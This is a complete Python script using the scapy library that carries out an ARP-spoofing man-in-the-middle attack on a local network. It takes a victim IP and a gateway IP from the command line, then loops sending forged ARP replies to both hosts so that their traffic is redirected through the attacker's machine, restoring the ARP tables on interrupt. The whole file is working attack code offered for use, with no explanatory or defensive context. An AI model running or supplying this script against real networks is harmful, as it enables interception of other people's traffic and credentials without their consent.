# pip install scapy
import scapy.all as scapy
import time
import optparse

def spoofer(victimIP, victimMac, gatewayIP):
    packet = scapy.ARP(op=2, pdst=victimIP, hwdst=victimMac, psrc=gatewayIP)
    scapy.send(packet, verbose=False)

def restore(victimIP, victimMac, gatewayIP, gatewayMac):
    packet = scapy.ARP(op=2, pdst=victimIP, hwdst=victimMac,
                       psrc=gatewayIP, hwsrc=gatewayMac)
    scapy.send(packet, count=4, verbose=False)

parser = optparse.OptionParser(
    "Usage : Scapy_MITM : -v <IP_Victim> -g <IP_Gateway>")

parser.add_option('-v', dest='victim', type='string', help='Victim\'s IP')
parser.add_option('-g', dest='gateway', type='string', help='Gateway\'s IP')

options, args = parser.parse_args()

if(options.victim == None) or (options.gateway == None):
    print(parser.usage)
    exit(0)

victimIP = options.victim
gatewayIP = options.gateway

victimMac = scapy.getmacbyip(victimIP)
gatewayMac = scapy.getmacbyip(gatewayIP)

print("Victim IP = {}\nVictim Mac = {}\n".format(victimIP, victimMac))
print(f"Gateway IP = {gatewayIP}\nGetaway Mc = {gatewayMac}")

try:
    while True:
        spoofer(victimIP, victimMac, gatewayIP)
        spoofer(gatewayIP, gatewayMac, victimIP)
        time.sleep(2)
except KeyboardInterrupt:
    print("restoring normal state")
    restore(victimIP, victimMac, gatewayIP, gatewayMac)
